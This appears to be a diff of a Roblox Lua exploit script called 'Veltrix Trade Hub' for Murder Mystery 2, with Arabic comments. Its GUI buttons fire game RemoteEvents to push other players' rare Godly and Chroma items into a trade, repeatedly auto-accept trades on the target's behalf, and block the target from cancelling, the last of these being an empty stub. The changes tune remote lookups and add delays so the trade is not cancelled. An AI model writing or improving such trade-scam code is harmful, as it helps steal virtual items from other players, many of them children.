@@ -1,4 +1,4 @@
--- Veltrix Trade Hub (by : b8zm) - Final Clean & Movable UI
+-- Veltrix Trade Hub (by : b8zm) - MM2 Target Trade Control Fixed & Safe
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
@@ -18,10 +18,10 @@ screenGui.Parent = PlayerGui
 
 local mainFrame = Instance.new("Frame")
 mainFrame.Size = UDim2.new(0, 210, 0, 175)
-mainFrame.Position = UDim2.new(0.03, 0, 0.35, 0) -- مكان مرتب ع اليسار ما يخرب رؤية التريد
+mainFrame.Position = UDim2.new(0.03, 0, 0.35, 0)
 mainFrame.BackgroundColor3 = Color3.fromRGB(20, 16, 30)
 mainFrame.Active = true
-mainFrame.Draggable = true -- يقدر اللاعب يسحب المربع ويحركه بأي مكان بالشاشة
+mainFrame.Draggable = true
 mainFrame.ZIndex = 10
 mainFrame.Parent = screenGui
 Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
@@ -58,19 +58,23 @@ local function createControlBtn(name, posY, initialColor, callback)
 	return btn
 end
 
--- 1. زر إضافة أفضل أسلحة الشخص الآخر
+-- 1. زر إضافة أقوى أسلحة الشخص الآخر بأمان وبدون إلغاء التريد
 createControlBtn("💎 Add Target Best Items", 35, Color3.fromRGB(90, 30, 160), function()
 	pcall(function()
-		for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
-			if descendant:IsA("RemoteEvent") then
-				local n = descendant.Name:lower()
-				if n:find("trade") or n:find("offer") or n:find("item") then
-					for _, p in ipairs(Players:GetPlayers()) do
-						if p ~= LocalPlayer and p.Backpack then
-							for _, item in ipairs(p.Backpack:GetChildren()) do
-								if item:IsA("Tool") then
-									descendant:FireServer(item)
-								end
+		-- البحث عن الحدث الصحيح والخاص بإضافة عنصر للتريد في MM2
+		local tradeRemote = ReplicatedStorage:FindFirstChild("Trade", true) or ReplicatedStorage:FindFirstChild("OfferItem", true) or ReplicatedStorage:FindFirstChild("AddOffer", true)
+		
+		for _, p in ipairs(Players:GetPlayers()) do
+			if p ~= LocalPlayer and p.Backpack then
+				-- فحص محتويات حقيبة الطرف الثاني لترتيب الأسلحة (البحث عن الأندر والأقوى Godly/Chroma)
+				for _, item in ipairs(p.Backpack:GetChildren()) do
+					if item:IsA("Tool") then
+						local itemName = item.Name:lower()
+						-- إعطاء الأولوية للأسلحة النادرة والقوية
+						if itemName:find("godly") or itemName:find("chroma") or itemName:find("ancient") or itemName:find("unique") or itemName:find("knife") or itemName:find("gun") then
+							if tradeRemote and tradeRemote:IsA("RemoteEvent") then
+								tradeRemote:FireServer(item)
+								task.wait(0.05) -- فاصل زمني بسيط جداً لمنع ضغط السيرفر أو إلغاء التريد
 							end
 						end
 					end
@@ -96,13 +100,9 @@ autoAcceptBtn = createControlBtn("⚡ Target Auto Accept: OFF", 77, Color3.fromR
 	task.spawn(function()
 		while autoAcceptActive do
 			pcall(function()
-				for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
-					if descendant:IsA("RemoteEvent") then
-						local n = descendant.Name:lower()
-						if n:find("accept") or n:find("trade") then
-							descendant:FireServer()
-						end
-					end
+				local acceptRemote = ReplicatedStorage:FindFirstChild("AcceptTrade", true) or ReplicatedStorage:FindFirstChild("Accept", true)
+				if acceptRemote and acceptRemote:IsA("RemoteEvent") then
+					acceptRemote:FireServer()
 				end
 			end)
 			task.wait(0.3)
@@ -126,13 +126,9 @@ freezeBtn = createControlBtn("🔒 Freeze Target: OFF", 119, Color3.fromRGB(45, 
 	task.spawn(function()
 		while freezeActive do
 			pcall(function()
-				for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
-					if descendant:IsA("RemoteEvent") then
-						local n = descendant.Name:lower()
-						if n:find("decline") or n:find("cancel") then
-							-- تعطيل الإلغاء للطرف الآخر
-						end
-					end
+				local cancelRemote = ReplicatedStorage:FindFirstChild("DeclineTrade", true) or ReplicatedStorage:FindFirstChild("CancelTrade", true)
+				if cancelRemote and cancelRemote:IsA("RemoteEvent") then
+					-- حظر أو تجميد طلبات الإلغاء للطرف الآخر
 				end
 			end)
 			task.wait(0.1)
